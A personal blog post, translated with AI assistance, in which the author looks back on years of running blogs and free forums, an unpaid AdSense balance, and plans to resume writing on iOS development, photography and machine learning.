sounds off!The hardest part is getting startedIt has been over 4 years since I last manag...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!The hardest part is getting startedIt has been over 4 years since I last managed my blog. The remaining ad revenue of US$88 was stuck all this time. Recently, I found out that you can actively request to close your Adsense account, and Google will pay out the final earnings once the minimum payout threshold is met. This gave me the motivation to start blogging again.Just arrived, starting with the simple title ‚ÄúThe Beginning is Always the Hardest.‚ÄùLooking back at the history of writing blogs, it was around middle school, during the peak of my gaming craze. At that time, our home computer was very poor and had almost no games to play. But at that playful age, even without games to play, I still had to turn on the computer every day. That was already very exciting for me back then.Due to the above reasons, most of my computer time is spent chatting with classmates on instant messaging and browsing websites; as you can imagine, it feels quite empty and lacks a sense of accomplishment (at least others can gain a sense of achievement from playing games).At that time, ‚ÄúBlogs‚Äù were booming, which was very new to me. The first platform I tried was the hugely popular Wretch. When I set up my account and opened my blog for the first time, I felt, ‚ÄúWow! I have my own website,‚Äù and ‚ÄúWow! I can even change the style, so cool.‚Äù Coincidentally, my school computer class taught web design (FrontPage 2003 / ÈòøËÅñÁ∂≤Á´ô), so I focused on exploring features for my first blog. I searched for materials, played with styles, and installed lots of very ‚Äútrendy‚Äù JavaScript plugins. However, the content quality was mostly nonsense.This gave me a deeper understanding of the online world, which I was previously clueless about, such as: how to find information, how to fix issues when plugins break, how to embed images, and more.Many of the data came from forums, which were very popular at the time. I was a typical lurker who only read and rarely posted, occasionally replying with ‚ÄúThanks for your generous sharing.‚Äù While browsing various forums, I discovered ‚Äúfree forums‚Äù where you could apply to become an admin and have your own forum. This was a level above blogging‚Äîbeing an ‚Äúadmin,‚Äù ‚Äúadmin,‚Äù ‚Äúadmin‚Äù felt really cool!Building on the basics of managing a blog, forums offer even more settings to explore (creating boards/member permissions/plugin center). You can customize everything yourself, as if entering another world.There are many free forum systems available; after trying several back and forth, some lacked complete features, some were restrictive, some unstable, and some had too many intrusive ads. The one that left the strongest impression was Marlito, which best met my needs and where I have managed my forum the longest.Meanwhile, the blog also moved to ‚ÄúYouthwant Blog‚Äù; the reason was that Wretch started imposing many restrictions. Youthwant was just starting out, so it was first-come, first-served, had fewer restrictions, and its features met my needs. This time, I actively manage the content, with 70% sharing useful apps (similar to A-Rong‚Äôs freebies) and the other 30% sharing forum experiences (settings/bug fixes).There are about 30 articles in total, with daily views around 200 people / a maximum of 500 people (which seems low now). The blog ranks in the top 10 on the YouTube network blog leaderboard, with most traffic coming from posts sharing useful apps. After managing it seriously for over a year, I then got busy with 9th-grade studies and high school, causing intermittent updates. Later, I joined athlete training and left the blog neglected.Due to the blog name being too cheesy, only a screenshot of the view count is provided.Later, I created another Blogger to record technical articles about programming issues and solutions; however, Blogger was difficult to use and lacked basic features, so I gave up after writing a few posts.Later, I applied for a domain and bought hosting to set up a WordPress blog myself. But since I had to handle everything‚Äîsetting up and adjusting features‚ÄîI couldn‚Äôt focus on writing content. I kept writing sporadically, and after the hosting expired, I didn‚Äôt renew it, so the site went offline until now.Summary: From initially finding blogs fascinating -&gt; to exploring and mastering blog features -&gt; to focusing on the essence of blogs‚Äîthe content -&gt; to sharing technical articlesBecame lazy, recorded less of the process, rarely reviewed or shared it, tasted the sweetness of ad revenue, and gradually drifted further from the original intention‚Äîthe simple passion to share with everyone.https://www.flickr.com/photos/zuvonne/3738631215Set a New Goal for Yourself: Teach and Learn, and Start Documenting Your Life Again! Technical aspects: iOS app development, Swift, PHP, MySQL‚Ä¶ Life aspects: work, photography, unboxing, and random thoughts Experience: Recently working on machine learning, starting from scratch Story aspect: experience in skill competitions, life observations This article is also published on my personal blog: [Click here]. If you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." } ]
